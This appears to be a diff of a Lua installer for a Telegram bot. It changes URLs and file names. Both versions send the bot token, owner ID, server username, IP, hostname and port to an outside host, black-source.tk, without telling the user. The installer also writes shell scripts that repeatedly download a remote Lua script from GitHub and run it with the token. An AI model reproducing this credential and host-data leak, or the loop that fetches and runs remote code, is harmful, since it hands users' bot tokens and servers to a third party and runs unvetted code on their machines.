@@ -16,9 +16,9 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "BGBBB"
+s = "main"
 
-q = "FBBBBB"
+q = "cDDDD"
 
 token = "]]..Token..[["
 
@@ -49,7 +49,7 @@ if not database:get(Server_Done.."UserSudo_Write") then
 print("\27[1;34mSend Your Id Sudo :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id="..Id)
+data,res = https.request("https://black-source.tk/BlackTeAM/inx.php?bn=info&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -68,25 +68,25 @@ end ---ifnot
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://black-source.tk/BlackTeAM/inx.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::Black::")
 local RunBot = io.open("Source", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/TEST
+cd $HOME/callback
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr TEST.lua
-wget "https://raw.githubusercontent.com/BOYKATEAM/TEST/BGBBB/Test.lua"
+rm -fr callback.lua 
+wget "https://raw.githubusercontent.com/TMLANA/callback/main/callback.lua "
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./Test.lua -p PROFILE --bot=$token
+./tg -s ./callback.lua  -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("Run", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/TEST
+cd $HOME/callback
 while(true) do
 rm -fr ../.telegram-cli
 screen -S ]]..database:get(Server_Done.."username")..[[ -X kill
